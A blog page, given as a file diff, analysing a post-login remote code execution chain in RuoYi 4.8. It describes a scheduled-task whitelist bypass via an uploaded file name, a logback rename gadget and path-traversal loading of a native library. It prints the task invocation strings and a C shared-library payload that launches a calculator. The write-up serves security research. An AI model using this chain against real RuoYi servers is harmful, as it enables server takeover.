@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      ruoyi4.8后台RCE分析 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ruoyi4.8后台RCE分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-05-24 00:19:11
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>利用需要知道profile目录</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://github.com/yangzongzhuan/RuoYi/releases">https://github.com/yangzongzhuan/RuoYi/releases</a></p>
+<p>导入数据库，修改application-druid中的数据库账号密码</p>
+<p>修改application中的文件路径及log存放路径</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570106614-1c8c4d77-07e9-438c-af22-69dadac62a4b.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570121645-3ceae8b1-28d7-467d-a62b-109d557df6f8.png"></p>
+<p>启动成功</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570134132-1811aca3-be96-410d-8b1b-200654bbc315.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570190551-5e9b1cde-dc6f-4b19-9474-cd05ff30c072.png"></p>
+<p>根据提交数据包锁定后端路由</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570479510-410a59b2-20a8-45c3-892d-5c91a9e28a5a.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745570492423-64eb72cd-babd-440b-8dec-d3339ce9974c.png"></p>
+<p>调试看一下具体做了什么</p>
+<p>前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571132042-5d65ddc8-7bd2-44dc-b86f-a0ff309b1ccc.png"></p>
+<p>还判断了是否有一些黑名单中的类</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571188433-4d6249c8-9583-4bb8-b910-12d23ebc3303.png"></p>
+<p>进入白名单的判断</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571245503-384ca840-b5ea-4e78-82ff-d945a1da78cf.png"></p>
+<p>提取出调用的类名，判断其中是否包含白名单字符串</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571276592-72aaff29-d879-4272-ae14-0991e7f81d90.png"></p>
+<p>白名单字符串为com.ruoyi.quartz.task</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571414207-5b26ab55-01c0-4149-a1e3-7aae69d3d3cc.png"></p>
+<p>注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571479372-ac5c5328-1808-4831-a5a4-98f178caae2c.png"></p>
+<p>后续就会进入正常的保存计划任务流程</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745571541968-276bfd22-c1ca-4f4e-881c-814f1c5ba4ca.png"></p>
+<p>当启动任务时，会调用方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745572064151-ba74bb45-19e4-47d8-91ce-7c6b116f05de.png"></p>
+<p>获取需要调用的类名方法名参数值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745572175226-c23d69d7-9196-4c23-a8d4-5a8390149651.png"></p>
+<p>在获取方法参数时进行了处理，只允许为字符串&#x2F;布尔&#x2F;长整&#x2F;浮点&#x2F;整形，无法传递类对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745572148795-ba7eca5a-a6f6-40f7-b526-ba3bef1f62e7.png"></p>
+<p>接着会实例化该类，反射调用其方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745572320841-6a834b2e-fcba-4781-a24c-9077df46223b.png"></p>
+<p>该方法为public修饰</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745572360911-7dd05a1d-3dd0-458a-9bba-b5de48177692.png"></p>
+<p>我们想要利用需要达成的是</p>
+<ul>
+<li>使用的类不在黑名单中</li>
+<li>要存在com.ruoyi.quartz.task字符串</li>
+<li>不可以使用rmi ldap http协议</li>
+</ul>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>而在ruoyi中存在一个文件上传点</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745574914838-75fd573d-b1ee-40e3-8754-1de79f3c117a.png"></p>
+<p>我们可以随便上传一个文件看看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745574965601-227899a1-3467-4062-9668-87386a850e0b.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745574984896-f0b577d6-204e-4b3e-a90f-629812afc95f.png"></p>
+<p>那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745575060624-a280c6e6-51cf-4449-9c46-14d78af48a05.png"></p>
+<h4 id="结合导致RCE"><a href="#结合导致RCE" class="headerlink" title="结合导致RCE"></a>结合导致RCE</h4><p>在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的<font style="color:rgba(0, 0, 0, 0.85);">构造函数</font></p>
+<p>而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745576156568-b196f0fe-1e99-44d0-aaf0-1e7fee4f343e.png"></p>
+<p><font style="color:#f8f8f2;background-color:#0a3b36;"> </font><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745576701451-c1bdcc7e-938f-4205-9e69-f41f081c95f3.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745576716233-e4adf05a-4b51-4a4f-9569-b510e49ab39c.png"></p>
+<p>注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题</p>
+<p><font style="color:#f8f8f2;background-color:#0a3b36;"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);">构造并上传链接库</font></p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#include &lt;stdio.h>
+#include &lt;unistd.h>
+#include &lt;stdlib.h>
+
+__attribute__ ((__constructor__)) void angel (void) &#123;
+    // 调用 system 函数打开计算器应用程序
+    system("open -a calculator");
+&#125;
+
+
+//gcc -arch x86_64 -shared -o 1.dylib calc.c
+//根据不同架构修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译后上传该文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745576872693-9a07239a-500f-4975-9599-130dd5248ed1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745576903585-c0ea6bfc-acd4-47eb-84f0-0eb41dae5857.png"></p>
+<p>我们还需要修改文件名，挖一个</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">import java
+
+from Method m,MethodCall mc
+where mc.getEnclosingStmt() = m.getBody().getAChild*() and
+    (mc.getCallee().hasName("rename") or 
+    mc.getCallee().hasName("renameTo") or
+    mc.getCallee().hasName("resolveSibling") or
+    mc.getCallee().hasName("copy") or
+    mc.getCallee().hasName("move"))
+select m,m.getDeclaringType()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1748016473625-be046587-bf00-4d0d-afff-be12be53ab9d.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1748016485661-0b80cc6e-d1c6-4705-89e1-467710d5c833.png"></p>
+<p>使用RenameUtil类方法去对文件名进行修改</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying("/Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001.txt","/Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001.dylib");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以修改指定文件名</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745577105051-993c581f-269f-423d-b3c0-0ee642f335a5.png"></p>
+<p>启动任务</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745577036890-84d76a99-3c99-428c-8507-f1521b2034ce.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745577046186-6c9464c0-e699-48fc-ba14-8945c3a43ea5.png"></p>
+<p>文件名修改成功</p>
+<p>尝试rce</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">com.sun.glass.utils.NativeLibLoader.loadLibrary('../../../../../../../../../../../Users/Aecous/tmp/upload/2025/04/25/com.ruoyi.quartz.task_20250425182743A001');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745577071781-785d9da8-ed2b-48ba-b8c5-a9036aec5150.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745577082516-0d4d0feb-9b22-4738-a6e6-1ee627f405fc.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/03/12/CVE-2024-22399-Seata-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-05-24 00:19:11
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/05/24/%E4%B8%80%E5%9C%BA%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%AF%BC%E8%87%B4RCE"><span class="toc-text">结合导致RCE</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ruoyi4.8%E5%90%8E%E5%8F%B0RCE%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F05%2F24%2Fruoyi4-8%25E5%2590%258E%25E5%258F%25B0RCE%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/05/24/ruoyi4-8%E5%90%8E%E5%8F%B0RCE%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
